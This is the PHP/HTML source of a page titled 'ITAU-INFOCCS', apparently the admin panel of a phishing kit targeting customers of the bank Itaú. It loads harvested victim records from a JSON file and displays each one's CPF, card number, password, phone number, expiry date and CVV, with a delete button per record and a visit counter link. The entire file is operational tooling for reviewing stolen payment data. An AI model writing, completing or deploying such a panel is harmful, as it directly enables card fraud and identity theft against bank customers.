<html style="background-color: black;">
    <head>
	<meta charset="utf-8">
	<style>
		span.bak768 {
			display: inline-block;
			width: 270px;
			height: 140px;
			padding: 5px;
			border: 1px solid black;    
			
		}
	</style>
	<title>INFOCCS</title>
	
		<style>
		h1 {
					font-family:Georgia, "Times New Roman", Times, serif;
					font-style:italic;
					font-size:30px;
					color:black;
					letter-spacing:-0.05;
					text-shadow:1px 1px 1px red;
					
		</style>
		<?php

			include("verifica.php");
			if(isset($_GET["acao"]) && $_GET["acao"] == "logout"){
				
				setcookie("logado","");
				echo '
				<script type="text/javascript">
				alert("Voce foi deslogado com sucesso, redirecionando clique em ok");
				location="index.php";
				</script>
				';
			}
		?>
		
	</head>
	<body style="
    background-color:white ;
">
	<center>
		 <h1 id="test">ITAU-INFOCCS</h1>
		 
		 <a href="?acao=logout">
		SAIR
		 </a>
		 <br>
		 <br>
		 <a href="contador.txt">
		 VISITAS
		 </a>
		 <br>
		 <br>
	</center>
	<center>
			<img src="imagens/deolhoemgravata-mor.gif" width="300px"  style="border-radius: 40%;">
			</center>
	
	
	</body>
	<div><br>
	<?php
	$fl = "ccs.json";
	if(file_exists($fl)){
		$h = fopen($fl, "r");
		$arr = json_decode(fread($h, filesize ($fl)));
		fclose($h);
		for($i = 0; $i < count($arr); $i++){
			echo '<span class="bak768">';
			echo "&nbsp&nbsp&nbspCPF: ".$arr[$i][0]."<br>&nbsp&nbsp&nbspCARD: ".$arr[$i][1]."<br>&nbsp&nbsp&nbspSENHA: ".$arr[$i][2]."<br>&nbsp&nbsp&nbspFONE: ".$arr[$i][3]."<br>&nbsp&nbsp&nbspVALIDADE: ".$arr[$i][4]."<br>&nbsp&nbsp&nbspCVV: ".$arr[$i][5]."<br>";
			echo '<center><a href="apagar.php?apg='.$i.'"><button >Excluir</button></a></center><hr><br>';
			echo '</span>';
		}
	}
	?>
	</div>
</html>
